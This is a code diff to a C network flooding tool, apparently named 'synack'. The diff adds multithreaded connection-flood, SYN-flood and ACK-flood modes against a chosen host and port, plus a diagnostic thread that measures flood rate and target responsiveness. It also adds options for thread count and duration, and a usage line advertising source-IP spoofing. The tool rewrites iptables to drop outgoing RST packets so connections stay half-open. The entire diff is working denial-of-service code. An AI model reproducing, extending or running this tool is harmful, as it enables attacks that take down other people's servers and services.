@@ -11,6 +11,11 @@
 #include <unistd.h>
 #include <time.h>
 #include <sys/time.h>
+#include <pthread.h>
+
+#define CONN_FLOOD 1
+#define SYN_FLOOD  2
+#define ACK_FLOOD  3
 
 int running = 1;
 uint32_t interface_addr;
@@ -19,17 +24,27 @@ uint16_t dest_port;
 uint32_t sleep_interval;
 uint16_t attack_uuid;
 int attack_time = 0;
-uint8_t *send_data = NULL;
-int send_data_size = 0;
-int syn_flood_only = 0;
+int num_threads = 1;
+int attack_type = CONN_FLOOD;
 
+/* handle stop signals */
 void signal_handler(int sig) {
     running = 0;
 }
 
-void syn_thread()
+uint32_t get_a_source_ip()
 {
-    leef_srand();
+    return interface_addr;
+}
+
+/* Connection flood */
+uint8_t *send_data = NULL;
+int send_data_size = 0;
+
+void *conn_flood_attack_thread(void *param)
+{
+    struct leef_handle leef;
+    leef_init(&leef, INJECTING);
 
     uint16_t src_port = leef_random_range(1025,65535);
     uint16_t id;
@@ -40,13 +55,21 @@ void syn_thread()
             src_port = 1025;
         id = leef_random_byte() << 8 | leef_random_byte();
         seq = attack_uuid << 16 | id;
-        leef_send_tcp_syn(interface_addr, dest_addr, src_port, dest_port, id, seq);
-        usleep(sleep_interval);
+        leef_send_tcp_syn(&leef, interface_addr, dest_addr, src_port, dest_port, id, seq);
+        if(sleep_interval)
+            usleep(sleep_interval);
     }
+
+    leef_terminate(&leef);
+    return NULL;
 }
 
-void sniff_thread()
+void *conn_flood_sniff_thread(void *param)
 {
+    struct leef_handle leef;
+    leef_init(&leef, SNIFFING_AND_INJECTING);
+    leef_set_sniff_packet_size(&leef, 64);
+
     uint16_t src_port;
     uint16_t id;
     uint32_t seq;
@@ -63,17 +86,10 @@ void sniff_thread()
 
     memset(conn_ports, 0, sizeof(conn_ports));
 
-    /* setup iptables */
-    system("/usr/sbin/iptables -F OUTPUT");
-    system("/usr/sbin/iptables -I OUTPUT -p tcp --tcp-flags ALL RST -j DROP");
-
     lastTicks = leef_get_ticks();
 
-    printf("wait 1 sec\r");
-    fflush(stdout);
-
     while(running && (attack_time <= 0 || leef_get_ticks() < attack_time)) {
-        if(leef_sniff_next_packet(&packet)) {
+        if(leef_sniff_next_packet(&leef, &packet)) {
             /* check if the packet is from the host */
             if(packet.ip->protocol == IPPROTO_TCP && packet.ip->saddr == dest_addr && packet.in_ip.tcp->source == dest_port) {
                 /* check if the packet was from this running attack instance */
@@ -82,25 +98,23 @@ void sniff_thread()
                 src_port = packet.in_ip.tcp->dest;
                 /* SYN+ACK */
                 if(packet.in_ip.tcp->syn == 1 && packet.in_ip.tcp->ack == 1) {
-                    if(!syn_flood_only) {
-                        id = ((packet.in_ip.tcp->ack_seq - 1) & 0xffff) + 1;
-                        seq = packet.in_ip.tcp->ack_seq;
-                        ack_seq = packet.in_ip.tcp->seq + 1;
+                id = ((packet.in_ip.tcp->ack_seq - 1) & 0xffff) + 1;
+                seq = packet.in_ip.tcp->ack_seq;
+                ack_seq = packet.in_ip.tcp->seq + 1;
 
-                        if(send_data_size) {
-                            leef_send_raw_tcp(interface_addr, dest_addr, src_port, dest_port, id, seq, ack_seq,
-                                              TCP_ACK | TCP_PUSH, 5840, 64, send_data_size, send_data);
-                        } else {
-                            leef_send_tcp_ack(interface_addr, dest_addr, src_port, dest_port, id, seq, ack_seq);
-                        }
-                    }
+                if(send_data_size) {
+                    leef_send_raw_tcp(&leef, interface_addr, dest_addr, src_port, dest_port, id, seq, ack_seq,
+                        TCP_ACK | TCP_PUSH, 5840, 64, send_data_size, send_data);
+                } else {
+                    leef_send_tcp_ack(&leef, interface_addr, dest_addr, src_port, dest_port, id, seq, ack_seq);
+                }
 
-                    synack_received++;
-                    if(!syn_flood_only && conn_ports[src_port] == 0) {
-                        conn_ports[src_port] = 1;
-                        alive_connections++;
-                        new_connections++;
-                    }
+                synack_received++;
+                if(conn_ports[src_port] == 0) {
+                    conn_ports[src_port] = 1;
+                    alive_connections++;
+                    new_connections++;
+                }
                 /* RST */
                 } else if(packet.in_ip.tcp->rst == 1) {
                     static int warned = 0;
@@ -112,7 +126,7 @@ void sniff_thread()
 
                     rst_received++;
 
-                    if(!syn_flood_only && conn_ports[src_port] == 1) {
+                    if(conn_ports[src_port] == 1) {
                         alive_connections--;
                         conn_ports[src_port] = 0;
                     }
@@ -127,7 +141,7 @@ void sniff_thread()
 
                     fin_received++;
 
-                    if(!syn_flood_only && conn_ports[src_port] == 1) {
+                    if(conn_ports[src_port] == 1) {
                         alive_connections--;
                         conn_ports[src_port] = 0;
                     }
@@ -139,13 +153,14 @@ void sniff_thread()
                 if(attack_uuid != ((packet.in_ip.tcp->seq & 0xffff0000) >> 16))
                     continue;
                 syn_sent++;
-                if(!syn_flood_only && conn_ports[packet.in_ip.tcp->source] == 1) {
+                if(conn_ports[packet.in_ip.tcp->source] == 1) {
                     conn_ports[packet.in_ip.tcp->source] = 0;
                     alive_connections--;
                 }
             }
         }
 
+        /* outputs attack information */
         if(leef_get_ticks() - lastTicks >= 1000) {
             printf("SYN: %d/s, SYN+ACK: %d/s, RST: %d/s, FIN: %d/s, NEW CONNs: %d/sec, FAILED CONNs: %d/sec, ALIVE CONNs: %d\n",
                    syn_sent, synack_received, rst_received, fin_received, new_connections, syn_sent - new_connections, alive_connections);
@@ -160,6 +175,125 @@ void sniff_thread()
         }
     }
     printf("\n");
+
+    leef_terminate(&leef);
+    return NULL;
+}
+
+/* SYN flood */
+void *syn_flood_attack_thread(void *param)
+{
+    struct leef_handle leef;
+    leef_init(&leef, INJECTING);
+
+    uint32_t src_ip;
+    uint16_t src_port;
+    uint16_t id;
+    uint32_t seq;
+
+    while(running && (attack_time <= 0 || leef_get_ticks() < attack_time)) {
+        src_ip = get_a_source_ip();
+        src_port = leef_random_range(1025,65535);
+        id = leef_random_u16();
+        seq = attack_uuid << 16 | leef_random_u16();
+        leef_send_tcp_syn(&leef, src_ip, dest_addr, src_port, dest_port, id, seq);
+        if(sleep_interval)
+            usleep(sleep_interval);
+    }
+
+    leef_terminate(&leef);
+    return NULL;
+}
+
+/* ACK flood */
+void *ack_flood_attack_thread(void *param)
+{
+    struct leef_handle leef;
+    leef_init(&leef, INJECTING);
+
+    uint32_t src_ip;
+    uint16_t src_port;
+    uint16_t id;
+    uint32_t seq;
+    uint32_t ack;
+
+    while(running && (attack_time <= 0 || leef_get_ticks() < attack_time)) {
+        src_ip = get_a_source_ip();
+        src_port = leef_random_range(1025,65535);
+        id = leef_random_u16();
+        seq = attack_uuid << 16 | leef_random_u16();
+        ack = leef_random_u32();
+        leef_send_tcp_ack(&leef, src_ip, dest_addr, src_port, dest_port, id, seq, ack);
+        if(sleep_interval)
+            usleep(sleep_interval);
+    }
+
+    leef_terminate(&leef);
+    return NULL;
+}
+
+/* diagnostics attack rate and effectivness */
+void *attack_diagnostic_thread(void *param)
+{
+    struct leef_handle leef;
+    leef_init(&leef, SNIFFING_AND_INJECTING);
+    leef_set_sniff_packet_size(&leef, 128);
+
+    uint32_t lastTicks;
+    int packets_sent;
+    struct leef_sniffed_packet packet;
+    uint16_t src_port = leef_random_range(1025,65535);
+    uint16_t id;
+    uint32_t seq;
+    uint32_t ping_ports[65536];
+
+    static struct timeval tv;
+    gettimeofday(&tv, 0);
+    uint32_t ping_uuid = (((tv.tv_sec % 1000) * 1000) + (tv.tv_usec / 1000)) & 0xffff;
+
+    lastTicks = leef_get_ticks();
+
+    while(running && (attack_time <= 0 || leef_get_ticks() < attack_time)) {
+        if(leef_sniff_next_packet(&leef, &packet)) {
+            /* check if the packet is from the host */
+            if(packet.ip->protocol == IPPROTO_TCP && packet.ip->saddr == dest_addr && packet.in_ip.tcp->source == dest_port && ping_uuid == ((packet.in_ip.tcp->ack_seq & 0xffff0000) >> 16)) {
+                /* got a ping reply */
+                printf("flags=%s rrt=%d ms\n", leef_name_tcp_flags(&packet), (leef_get_ticks() - ping_ports[packet.in_ip.tcp->dest]));
+            /* check if the packet is to the host */
+            } else if(packet.ip->protocol == IPPROTO_TCP && packet.ip->daddr == dest_addr && packet.in_ip.tcp->dest == dest_port && attack_uuid == ((packet.in_ip.tcp->seq & 0xffff0000) >> 16)) {
+                packets_sent++;
+            }
+
+            /* outputs attack information */
+            if(leef_get_ticks() - lastTicks >= 1000) {
+                switch(attack_type) {
+                    case SYN_FLOOD:
+                        printf("SYN: ");
+                        break;
+                    case ACK_FLOOD:
+                        printf("ACK: ");
+                        break;
+                }
+                printf("%d/s\n", packets_sent);
+                fflush(stdout);
+
+                packets_sent = 0;
+                lastTicks = leef_get_ticks();
+
+                /* send a SYN ping */
+                if(++src_port <= 1024)
+                    src_port = 1025;
+
+                id = leef_random_u16();
+                seq = ping_uuid << 16 | leef_random_u16();
+                leef_send_tcp_syn(&leef, interface_addr, dest_addr, src_port, dest_port, id, seq);
+                ping_ports[src_port] = lastTicks;
+            }
+        }
+    }
+
+    leef_terminate(&leef);
+    return NULL;
 }
 
 int main(int argc, char **argv)
@@ -169,18 +303,21 @@ int main(int argc, char **argv)
     signal(SIGHUP, &signal_handler);
     signal(SIGKILL, &signal_handler);
 
-    if(!leef_init())
-        return -1;
-    leef_set_sniff_packet_size(128);
-
     if(argc < 5) {
-        printf("Usage: %s <interface ip> <host> <port> <interval> [options]\n", argv[0]);
-        printf("Options: \n");
-        printf("-t [attack time]\t- Attack time in seconds\n");
-        printf("-d [file]\t- Send binary file as data when establishing connections\n");
-        printf("-n \t- Do not establish connections, do a simple SYN flood\n");
+        printf("Usage: %s <interface ip> <host> <port> <interval> [attack type] [options]\n", argv[0]);
+        printf("Attack types:\n");
+        printf("  -C                - Connection flood\n");
+        printf("  -S                - SYN flood\n");
+        printf("  -A                - ACK flood\n");
+        printf("Options:\n");
+        printf("  -m [threads]      - Number of attack threads\n");
+        printf("  -t [attack time]  - Attack time in seconds\n");
+        printf("  -s [file]         - Read a list os ips/subnets from a file for spoofing (only for SYN or ACK flood)\n");
+        printf("  -d [file]         - Send binary file as data (only for Connection flood)\n");
         printf("* send interval in microseconds\n");
         printf("* default attack time: infinite\n");
+        printf("* default threads: 1\n");
+        printf("* default attack type: Connection flood\n");
         return 0;
     }
 
@@ -200,6 +337,22 @@ int main(int argc, char **argv)
         opt = argv[arg];
         if(opt && opt[0] == '-' && strlen(opt) == 2) {
             switch(opt[1]) {
+                case 'C':
+                    attack_type = CONN_FLOOD;
+                    break;
+                case 'S':
+                    attack_type = SYN_FLOOD;
+                    break;
+                case 'A':
+                    attack_type = ACK_FLOOD;
+                    break;
+                case 'm':
+                    num_threads = atoi(argv[++arg]);
+                    if(num_threads <= 0) {
+                        fprintf(stderr, "use at least 1 thread\n");
+                        return -1;
+                    }
+                    break;
                 case 't':
                     attack_time = atoi(argv[++arg])*1000;
                     break;
@@ -218,9 +371,6 @@ int main(int argc, char **argv)
                     }
                     break;
                 }
-                case 'n':
-                    syn_flood_only = 1;
-                    break;
                 default:
                     fprintf(stderr, "incorrect option %s\n", opt);
                     return -1;
@@ -234,12 +384,32 @@ int main(int argc, char **argv)
     printf("stating synack..\n");
     printf("target: %s:%d\n", leef_addr_to_string(dest_addr), dest_port);
 
-    pid_t pid = fork();
-    if(pid == 0) // child
-        syn_thread();
-    else
-        sniff_thread();
+    pthread_t *threads = (pthread_t *)malloc(sizeof(pthread_t) * num_threads);
+    int i;
 
-    leef_terminate();
+    system("/usr/sbin/iptables -F OUTPUT");
+    system("/usr/sbin/iptables -I OUTPUT -p tcp --tcp-flags ALL RST -j DROP");
+
+    switch(attack_type) {
+        case CONN_FLOOD:
+            for(i=0; i < num_threads; ++i)
+                pthread_create(&threads[i], NULL, conn_flood_attack_thread, NULL);
+            conn_flood_sniff_thread(NULL);
+            break;
+        case SYN_FLOOD:
+            for(i=0; i < num_threads; ++i)
+                pthread_create(&threads[i], NULL, syn_flood_attack_thread, NULL);
+            attack_diagnostic_thread(NULL);
+            break;
+        case ACK_FLOOD:
+            for(i=0; i < num_threads; ++i)
+                pthread_create(&threads[i], NULL, ack_flood_attack_thread, NULL);
+            attack_diagnostic_thread(NULL);
+            break;
+    }
+
+    for(i=0;i<num_threads;++i)
+        pthread_join(threads[i], NULL);
+
     return 0;
 }
